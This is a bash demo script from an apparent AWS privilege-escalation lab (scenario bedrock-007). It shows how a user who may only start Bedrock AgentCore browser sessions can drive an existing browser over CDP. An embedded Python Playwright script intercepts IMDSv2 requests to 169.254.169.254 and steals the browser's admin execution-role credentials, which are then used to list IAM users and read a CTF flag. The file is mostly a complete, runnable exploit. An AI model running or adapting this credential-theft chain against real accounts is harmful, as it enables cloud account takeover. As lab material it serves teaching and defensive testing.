#!/bin/bash

# Demo script for bedrockagentcore-startbrowsersession+cdp privilege escalation (bedrock-007)
# This scenario demonstrates how a principal with bedrock-agentcore:StartBrowserSession and
# ConnectBrowserAutomationStream can drive an EXISTING Custom Browser over CDP/Playwright,
# intercept MMDS requests via context.route(), and steal the execution role's temporary
# IAM credentials from 169.254.169.254 to gain admin access.
# No iam:PassRole required — the Browser is already deployed with an admin execution role.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-007-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-007-to-admin-target-role"
PYTHON_SCRIPT="/tmp/extract_bedrock_007_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AgentCore Custom Browser CDP Credential Theft to Admin Demo${NC}"
echo -e "${GREEN}Scenario: bedrockagentcore-startbrowsersession+cdp (bedrock-007)${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario demonstrates exploiting StartBrowserSession +${NC}"
echo -e "${BLUE}ConnectBrowserAutomationStream on an EXISTING Custom Browser that${NC}"
echo -e "${BLUE}has a privileged IAM execution role attached. No iam:PassRole required!${NC}"
echo -e "${BLUE}The attack drives the browser over CDP and uses context.route() to${NC}"
echo -e "${BLUE}intercept and rewrite the IMDSv2 token PUT request before fetching creds.${NC}\n"

# Step 1: Check prerequisites
echo -e "${YELLOW}Step 1: Checking prerequisites${NC}"
echo "Checking for required tools..."

if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

if ! python3 -c "import boto3" 2>/dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed${NC}"

if ! python3 -c "from playwright.sync_api import sync_playwright" 2>/dev/null; then
    echo -e "${RED}Error: playwright is not installed${NC}"
    echo "Please install playwright: pip3 install playwright && playwright install chromium"
    exit 1
fi
echo -e "${GREEN}✓ playwright is installed${NC}"
echo ""

# Step 2: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 2: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_007_bedrockagentcore_startbrowsersession_cdp.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
BROWSER_SSM_PARAM=$(echo "$MODULE_OUTPUT" | jq -r '.target_browser_ssm_param')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract starting user credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

if [ "$BROWSER_SSM_PARAM" == "null" ] || [ -z "$BROWSER_SSM_PARAM" ]; then
    echo -e "${YELLOW}Warning: Could not extract browser SSM param name from terraform output, defaulting to /pathfinding-labs/bedrock-007/browser-id${NC}"
    BROWSER_SSM_PARAM="/pathfinding-labs/bedrock-007/browser-id"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Browser SSM param: $BROWSER_SSM_PARAM"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

DEMO_COMPLETED=0

# Exit trap: restore helpful permissions and remove temp files on any non-clean exit.
# This scenario creates no AWS resources, so no resource deletion is needed in the trap.
_bedrock_007_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM
    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    rm -f "$PYTHON_SCRIPT"
    exit $exit_code
}
trap _bedrock_007_exit_handler EXIT INT TERM

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 3: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 6: Read the browser ID from SSM Parameter Store
# The browser ID is stored in SSM by Terraform. An attacker with bedrock-agentcore:ListBrowsers
# would discover it directly; here we read it from the known SSM param path.
echo -e "${YELLOW}Step 6: Reading target browser ID from SSM Parameter Store${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "SSM parameter: $BROWSER_SSM_PARAM"
show_cmd "ReadOnly" "aws ssm get-parameter --name $BROWSER_SSM_PARAM --region $AWS_REGION --query 'Parameter.Value' --output text"
BROWSER_ID=$(aws ssm get-parameter \
    --name "$BROWSER_SSM_PARAM" \
    --region "$AWS_REGION" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -z "$BROWSER_ID" ] || [ "$BROWSER_ID" == "None" ]; then
    echo -e "${RED}Error: Could not retrieve browser ID from SSM parameter $BROWSER_SSM_PARAM${NC}"
    echo "Make sure the scenario is deployed and the browser has been provisioned."
    exit 1
fi

echo "Browser ID: $BROWSER_ID"
echo -e "${GREEN}✓ Retrieved browser ID${NC}\n"

# [OBSERVATION] Step 7: Inspect the target browser's configuration
# GetBrowser uses a helpful permission (bedrock-agentcore:GetBrowser). We run it via the
# readonly user so the restriction policy's explicit Deny on the starting user doesn't block it.
echo -e "${YELLOW}Step 7: Inspecting target browser configuration${NC}"
echo "Confirming browser has an admin execution role attached and is in READY state..."
echo ""

show_cmd "ReadOnly" "aws bedrock-agentcore-control get-browser --browser-id $BROWSER_ID --region $AWS_REGION --output json"
BROWSER_DETAILS=$(aws bedrock-agentcore-control get-browser \
    --browser-id "$BROWSER_ID" \
    --region "$AWS_REGION" \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    EXEC_ROLE=$(echo "$BROWSER_DETAILS" | jq -r '.executionRoleArn // "unknown"')
    BROWSER_STATUS=$(echo "$BROWSER_DETAILS" | jq -r '.status // "unknown"')
    echo "  Execution Role: $EXEC_ROLE"
    echo "  Status:         $BROWSER_STATUS"
    echo ""
    if [[ "$EXEC_ROLE" == *"$TARGET_ROLE"* ]]; then
        echo -e "${GREEN}✓ Confirmed: browser uses the admin execution role${NC}"
    else
        echo -e "${YELLOW}Note: execution role is $EXEC_ROLE${NC}"
    fi
    if [ "$BROWSER_STATUS" != "READY" ]; then
        echo -e "${YELLOW}Warning: browser status is $BROWSER_STATUS (expected READY)${NC}"
        echo "The browser may still be provisioning — wait a moment and retry."
    fi
else
    echo -e "${YELLOW}Note: Could not describe browser — proceeding with known target${NC}"
fi
echo ""

# [EXPLOIT] Step 8: Start a browser session
echo -e "${YELLOW}Step 8: Starting a browser session${NC}"
echo "Calling StartBrowserSession to obtain a CDP WebSocket endpoint..."
echo ""
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "aws bedrock-agentcore start-browser-session --browser-identifier $BROWSER_ID --region $AWS_REGION --output json"
SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session \
    --browser-identifier "$BROWSER_ID" \
    --region "$AWS_REGION" \
    --output json 2>&1)

SESSION_START_EXIT=$?

if [ $SESSION_START_EXIT -ne 0 ]; then
    echo -e "${RED}Error: StartBrowserSession failed${NC}"
    echo "$SESSION_RESPONSE"
    exit 1
fi

SESSION_ID=$(echo "$SESSION_RESPONSE" | jq -r '.sessionId // empty')
WS_URL=$(echo "$SESSION_RESPONSE" | jq -r '.streams.automationStream.streamEndpoint // empty')

if [ -z "$SESSION_ID" ] || [ "$SESSION_ID" == "null" ]; then
    echo -e "${RED}Error: Could not parse session ID from StartBrowserSession response${NC}"
    echo "$SESSION_RESPONSE"
    exit 1
fi

if [ -z "$WS_URL" ] || [ "$WS_URL" == "null" ]; then
    echo -e "${RED}Error: Could not parse CDP WebSocket URL from StartBrowserSession response${NC}"
    echo "$SESSION_RESPONSE"
    exit 1
fi

echo "Session ID: $SESSION_ID"
echo "CDP WebSocket URL: ${WS_URL:0:80}..."
echo -e "${GREEN}✓ Browser session started — CDP WebSocket URL obtained${NC}\n"

# Note: bedrock-agentcore:ConnectBrowserAutomationStream is the IAM permission that
# AWS checks when Playwright authenticates the WebSocket upgrade (SigV4 signed headers).
# It is not a separate API call — the URL returned by StartBrowserSession is used directly.

# Step 10: Write the Python credential-extraction script
echo -e "${YELLOW}Step 10: Writing CDP/Playwright credential extraction script${NC}"
echo "Writing Python script to: $PYTHON_SCRIPT"

cat > "$PYTHON_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Bedrock AgentCore Custom Browser CDP Credential Theft — bedrock-007

Connects to the running Custom Browser over CDP using the WebSocket URL from
StartBrowserSession. The WebSocket endpoint requires SigV4 authentication —
bedrock-agentcore:ConnectBrowserAutomationStream is the IAM permission AWS
checks on the WebSocket upgrade, signed via the botocore SigV4 headers.

Uses page.goto() navigation (not fetch) to reach MMDS — navigation requests
bypass Chrome's Private Network Access (PNA) policy that blocks sub-resource
fetch() calls to link-local addresses (169.254.x.x).

Usage: python3 extract_bedrock_007_creds.py <browser_id> <region> <ws_url>
"""

import sys
import json
import os
from urllib.parse import urlparse

from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.credentials import Credentials
from playwright.sync_api import sync_playwright

if len(sys.argv) < 4:
    print("Usage: python3 extract_bedrock_007_creds.py <browser_id> <region> <ws_url>", file=sys.stderr)
    sys.exit(1)

BROWSER_ID = sys.argv[1]
AWS_REGION  = sys.argv[2]
WS_URL      = sys.argv[3]

MMDS_TOKEN_URL = "http://169.254.169.254/latest/api/token"
MMDS_CREDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials"

def sign_websocket_headers(ws_url, region):
    """Generate SigV4 auth headers for a WebSocket connection to AgentCore."""
    access_key = os.environ.get('AWS_ACCESS_KEY_ID', '')
    secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    session_token = os.environ.get('AWS_SESSION_TOKEN')

    if not access_key or not secret_key:
        print("Error: AWS credentials not found in environment", file=sys.stderr)
        sys.exit(1)

    creds = Credentials(access_key, secret_key, session_token)
    signing_url = ws_url.replace('wss://', 'https://')
    parsed = urlparse(signing_url)
    request = AWSRequest(method='GET', url=signing_url, headers={'host': parsed.hostname})
    SigV4Auth(creds, 'bedrock-agentcore', region).add_auth(request)
    return dict(request.headers)

print(f"[*] Connecting to browser {BROWSER_ID} via CDP...", file=sys.stderr)
print(f"[*] Signing WebSocket connection with SigV4...", file=sys.stderr)

signed_headers = sign_websocket_headers(WS_URL, AWS_REGION)

state = {'token': None}

def handle_mmds_route(route, request):
    url = request.url
    if url == MMDS_TOKEN_URL:
        route.continue_(
            method="PUT",
            headers={
                **dict(request.headers),
                "X-aws-ec2-metadata-token-ttl-seconds": "60",
            },
        )
    elif state['token']:
        route.continue_(
            headers={
                **dict(request.headers),
                "X-aws-ec2-metadata-token": state['token'],
            },
        )
    else:
        route.continue_()

with sync_playwright() as p:
    browser = p.chromium.connect_over_cdp(WS_URL, headers=signed_headers)
    context = browser.new_context()
    context.route("http://169.254.169.254/**", handle_mmds_route)
    page = context.new_page()

    print("[*] Connected. Acquiring IMDSv2 token via page navigation...", file=sys.stderr)
    token_resp = page.goto(MMDS_TOKEN_URL, wait_until="commit")
    if not token_resp or not token_resp.ok:
        status = token_resp.status if token_resp else "no response"
        print(f"[-] MMDS token request failed (status {status})", file=sys.stderr)
        sys.exit(1)
    state['token'] = token_resp.text().strip()
    print(f"[+] Obtained IMDSv2 token ({len(state['token'])} chars)", file=sys.stderr)

    print("[*] Fetching IAM role name from MMDS...", file=sys.stderr)
    role_resp = page.goto(f"{MMDS_CREDS_URL}/", wait_until="commit")
    if not role_resp or not role_resp.ok:
        status = role_resp.status if role_resp else "no response"
        print(f"[-] Could not fetch role name from MMDS (status {status})", file=sys.stderr)
        sys.exit(1)
    role_name = role_resp.text().strip()
    print(f"[+] Discovered IAM role name: {role_name}", file=sys.stderr)

    print(f"[*] Fetching credentials for role {role_name}...", file=sys.stderr)
    creds_resp = page.goto(f"{MMDS_CREDS_URL}/{role_name}", wait_until="commit")
    if not creds_resp or not creds_resp.ok:
        status = creds_resp.status if creds_resp else "no response"
        print(f"[-] Could not fetch credentials from MMDS (status {status})", file=sys.stderr)
        sys.exit(1)
    creds_text = creds_resp.text()

    browser.close()

if not creds_text:
    print("[-] No credentials returned from MMDS", file=sys.stderr)
    sys.exit(1)

try:
    creds = json.loads(creds_text)
    access_key = creds.get("AccessKeyId", "")
    secret_key = creds.get("SecretAccessKey", "")
    token_val = creds.get("Token", "")
    expiration = creds.get("Expiration", "N/A")
    if not access_key or not secret_key or not token_val:
        print("[-] Incomplete credentials in MMDS response:", file=sys.stderr)
        print(json.dumps(creds, indent=2), file=sys.stderr)
        sys.exit(1)
    print("\n" + "=" * 60, file=sys.stderr)
    print("EXTRACTED CREDENTIALS (execution role via CDP IMDS):", file=sys.stderr)
    print("=" * 60, file=sys.stderr)
    print(f"AccessKeyId     : {access_key}", file=sys.stderr)
    print(f"SecretAccessKey : {secret_key[:20]}...", file=sys.stderr)
    print(f"Token           : {token_val[:50]}...", file=sys.stderr)
    print(f"Expiration      : {expiration}", file=sys.stderr)
    print("=" * 60 + "\n", file=sys.stderr)
    print(json.dumps(creds))
except json.JSONDecodeError:
    print(creds_text)

PYTHON_EOF

chmod +x "$PYTHON_SCRIPT"
echo -e "${GREEN}✓ Credential extraction script written${NC}\n"

# [EXPLOIT] Step 11: Execute the Python script to steal MMDS credentials via CDP
echo -e "${YELLOW}Step 11: Connecting to browser over CDP and extracting MMDS credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Running Playwright script against the live browser session..."
echo ""

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $BROWSER_ID $AWS_REGION \"$WS_URL\""
CREDS_JSON=$(python3 "$PYTHON_SCRIPT" "$BROWSER_ID" "$AWS_REGION" "$WS_URL" 2>/tmp/extract_bedrock_007_stderr.txt)
PYTHON_EXIT=$?

# Show stderr (diagnostic output from the script) regardless of outcome
if [ -s /tmp/extract_bedrock_007_stderr.txt ]; then
    cat /tmp/extract_bedrock_007_stderr.txt
fi
rm -f /tmp/extract_bedrock_007_stderr.txt

echo ""

if [ $PYTHON_EXIT -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to extract credentials from IMDS via CDP${NC}"
    exit 1
fi

EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // empty' 2>/dev/null)
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // empty' 2>/dev/null)
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // empty' 2>/dev/null)

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not parse credentials from IMDS response${NC}"
    echo "Raw output: $CREDS_JSON"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted execution role credentials from IMDS via CDP!${NC}\n"

# Remove the temporary script now that it has been executed
rm -f "$PYTHON_SCRIPT"

# [EXPLOIT] Step 12: Switch to the extracted execution role credentials
echo -e "${YELLOW}Step 12: Switching to extracted execution role credentials${NC}"
# These are the browser's execution role temporary credentials stolen from IMDS via CDP.
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Verifying identity with extracted credentials..."
show_cmd "Attacker (stolen role)" "aws sts get-caller-identity --query 'Arn' --output text"
ELEVATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ELEVATED_IDENTITY"

if [[ "$ELEVATED_IDENTITY" == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully operating as the admin execution role!${NC}"
else
    echo -e "${YELLOW}Note: operating as $ELEVATED_IDENTITY${NC}"
fi
echo ""

# [EXPLOIT] Step 13: Verify administrator access
echo -e "${YELLOW}Step 13: Verifying administrator access${NC}"
echo "Attempting to list IAM users with the stolen execution role credentials..."
echo ""

show_cmd "Attacker (stolen role)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 14: Capture the CTF flag
# The stolen execution role credentials carry AdministratorAccess, which grants ssm:GetParameter.
# No extra permissions or credential switches are needed.
echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/bedrock-007-to-admin"

show_attack_cmd "Attacker (stolen role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
DEMO_COMPLETED=1

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (only bedrock-agentcore:StartBrowserSession + ConnectBrowserAutomationStream)"
echo "2. Read browser ID from SSM: $BROWSER_ID"
echo "3. Confirmed browser uses the admin execution role: $TARGET_ROLE"
echo "4. Called StartBrowserSession — response included CDP WebSocket URL directly"
echo "5. Connected to the browser over CDP using Playwright with SigV4 signed headers"
echo "6. Installed context.route() handler to intercept MMDS traffic at 169.254.169.254"
echo "7. Used page.goto() navigations to perform IMDSv2 token exchange and read execution role credentials"
echo "9. Gained full admin access as the browser's execution role"
echo "10. Captured CTF flag from SSM: $FLAG_VALUE"

echo -e "\n${YELLOW}Key Points:${NC}"
echo "- No iam:PassRole required (Browser already exists with admin execution role)"
echo "- Only needs: bedrock-agentcore:StartBrowserSession + ConnectBrowserAutomationStream"
echo "- context.route() intercepts IMDS requests at the network layer inside the browser sandbox"
echo "- IMDSv2 PUT rewrite header trick allows the token handshake to succeed from the browser"
echo "- The execution role's IMDS credentials are accessible from inside any browser page"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → (bedrock-agentcore:StartBrowserSession + ConnectBrowserAutomationStream)"
echo "  → CDP WebSocket → Playwright context.route() IMDS intercept"
echo "  → 169.254.169.254 IMDSv2 execution role credential theft"
echo "  → $TARGET_ROLE (AdministratorAccess)"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Python script: $PYTHON_SCRIPT (deleted)"
echo "- Extracted temporary credentials (will expire)"

echo -e "\n${RED}⚠ Warning: The extracted credentials are temporary and will expire${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
